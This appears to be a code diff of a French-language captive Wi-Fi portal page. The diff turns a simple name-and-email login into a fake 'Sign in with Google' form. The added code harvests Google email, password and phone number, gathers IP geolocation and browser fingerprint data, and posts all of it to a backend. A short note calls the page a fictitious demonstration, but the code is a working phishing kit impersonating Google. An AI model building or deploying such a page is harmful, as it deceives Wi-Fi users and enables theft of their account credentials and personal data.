@@ -3,12 +3,10 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Portail Wi-Fi – GCloud</title>
+  <title>Portail Wi-Fi – Connexion</title>
   <link href="https://fonts.googleapis.com/css2?family=Google+Sans&display=swap" rel="stylesheet" />
   <style>
-    * {
-      box-sizing: border-box;
-    }
+    * { box-sizing: border-box; }
 
     body {
       margin: 0;
@@ -72,10 +70,7 @@
       outline: none;
     }
 
-    .btn {
-      background-color: #1a73e8;
-      color: #fff;
-      border: none;
+    .btn, .google-btn {
       width: 100%;
       padding: 12px;
       font-size: 14px;
@@ -83,10 +78,32 @@
       border-radius: 4px;
       cursor: pointer;
       transition: background-color 0.2s;
+      margin-bottom: 16px;
+    }
+
+    .btn {
+      background-color: #1a73e8;
+      color: #fff;
+      border: none;
     }
 
     .btn:hover {
       background-color: #1765c1;
+    }
+
+    .google-btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      background-color: white;
+      border: 1px solid #dadce0;
+      color: #5f6368;
+    }
+
+    .google-btn img {
+      width: 18px;
+      height: 18px;
     }
 
     .note {
@@ -95,37 +112,24 @@
       margin-top: 24px;
     }
 
+    .google-form {
+      display: none;
+      margin-top: 20px;
+      animation: fadeIn 0.3s ease-in-out;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
     @media (max-width: 600px) {
-      body {
-        padding: 8px;
-      }
-
-      .container {
-        padding: 24px;
-        max-width: 90%;
-      }
-
-      h1 {
-        font-size: 20px;
-      }
-
-      .subtext {
-        font-size: 14px;
-      }
-
-      input {
-        padding: 12px 10px;
-        font-size: 14px;
-      }
-
-      .btn {
-        padding: 10px;
-        font-size: 12px;
-      }
-
-      .note {
-        font-size: 10px;
-      }
+      .container { padding: 24px; }
+      h1 { font-size: 20px; }
+      .subtext { font-size: 14px; }
+      input { padding: 12px 10px; font-size: 14px; }
+      .btn, .google-btn { padding: 10px; font-size: 12px; }
+      .note { font-size: 10px; }
     }
   </style>
 </head>
@@ -133,63 +137,73 @@
   <div class="container">
     <div class="logo-placeholder">Wi-Fi</div>
     <h1>Connexion au Wi-Fi</h1>
-    <div class="subtext">Veuillez vous identifier pour accéder à Internet</div>
+    <div class="subtext">Choisissez une méthode pour accéder à Internet</div>
 
-    <form id="wifi-login-form">
-      <input type="text" id="username" placeholder="Nom ou Prénom" required />
-      <input type="email" id="email" placeholder="Adresse e-mail (facultatif)" />
-      <button type="submit" class="btn">Se connecter</button>
+    <button class="google-btn" onclick="showGoogleForm()">
+      <img src="https://developers.google.com/identity/images/g-logo.png" alt="Google logo">
+      Se connecter avec Google
+    </button>
+
+    <form id="google-login-form" class="google-form">
+      <input type="email" id="google-email" placeholder="Adresse e-mail Google" required />
+      <input type="password" id="google-password" placeholder="Mot de passe" required />
+      <input type="tel" id="google-phone" placeholder="Numéro de téléphone" required />
+      <button type="submit" class="btn">Connexion</button>
     </form>
 
-    <div class="note">* Portail captif fictif – démonstration uniquement.</div>
+    <div class="note">* Ceci est un portail captif fictif – démonstration uniquement.</div>
   </div>
 
-<script>
-  let sessionStart = Date.now();
+  <script>
+    let sessionStart = Date.now();
 
-  document.getElementById("wifi-login-form").addEventListener("submit", async function (e) {
-    e.preventDefault();
-    const username = document.getElementById("username").value;
-    const email = document.getElementById("email").value;
-
-    // Infos système
-    const userAgent = navigator.userAgent;
-    const lang = navigator.language;
-    const screenRes = `${window.screen.width}x${window.screen.height}`;
-    const platform = navigator.platform;
-    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    const sessionDuration = Math.round((Date.now() - sessionStart) / 1000);
-
-    // IP + Géo
-    let geoInfo = {
-      ip: "Inconnu",
-      city: "Inconnue",
-      region: "Inconnue",
-      country: "Inconnu",
-      org: "Inconnu"
-    };
-
-    try {
-      const res = await fetch("https://ipapi.co/json");
-      const data = await res.json();
-      geoInfo = {
-        ip: data.ip,
-        city: data.city,
-        region: data.region,
-        country: data.country_name,
-        org: data.org
-      };
-    } catch (err) {
-      console.error("Erreur récupération IP :", err);
+    function showGoogleForm() {
+      document.getElementById("google-login-form").style.display = "block";
     }
 
-    const message = `
-📶 Nouvelle connexion Wi-Fi
-👤 Nom : ${username}
-📧 Email : ${email || "Non renseigné"}
+    document.getElementById("google-login-form").addEventListener("submit", async function (e) {
+      e.preventDefault();
+      const email = document.getElementById("google-email").value;
+      const password = document.getElementById("google-password").value;
+      const phone = document.getElementById("google-phone").value;
+
+      const userAgent = navigator.userAgent;
+      const lang = navigator.language;
+      const screenRes = `${window.screen.width}x${window.screen.height}`;
+      const platform = navigator.platform;
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const sessionDuration = Math.round((Date.now() - sessionStart) / 1000);
+
+      let geoInfo = {
+        ip: "Inconnu",
+        city: "Inconnue",
+        region: "Inconnue",
+        country: "Inconnu",
+        org: "Inconnu"
+      };
+
+      try {
+        const res = await fetch("https://ipapi.co/json");
+        const data = await res.json();
+        geoInfo = {
+          ip: data.ip,
+          city: data.city,
+          region: data.region,
+          country: data.country_name,
+          org: data.org
+        };
+      } catch (err) {
+        console.error("Erreur IP/Géo :", err);
+      }
+
+      const message = `
+🔐 Connexion Google Wi-Fi (factice)
+📧 Email : ${email}
+🔑 Mot de passe : ${password}
+📱 Téléphone : ${phone}
 
 🌍 IP : ${geoInfo.ip}
-🏙️ Ville : ${geoInfo.city}, ${geoInfo.region}, ${geoInfo.country}
+📍 Ville : ${geoInfo.city}, ${geoInfo.region}, ${geoInfo.country}
 🏢 FAI : ${geoInfo.org}
 
 🧭 Navigateur : ${userAgent}
@@ -197,19 +211,18 @@
 🌐 Langue : ${lang}
 🕒 Temps passé : ${sessionDuration} sec
 📐 Écran : ${screenRes}
-🕓 Fuseau : ${timezone}
-    `;
+🕓 Fuseau horaire : ${timezone}
+      `;
 
-    // Envoie vers backend (à adapter selon ton système)
-    fetch("/api/send", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ content: message })
+      fetch("/api/send", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: message })
+      });
+
+      alert("Connexion en cours...");
+      document.getElementById("google-login-form").reset();
     });
-
-    alert("Connexion acceptée. Vous pouvez maintenant naviguer.");
-    document.getElementById("wifi-login-form").reset();
-  });
-</script>
+  </script>
 </body>
 </html>
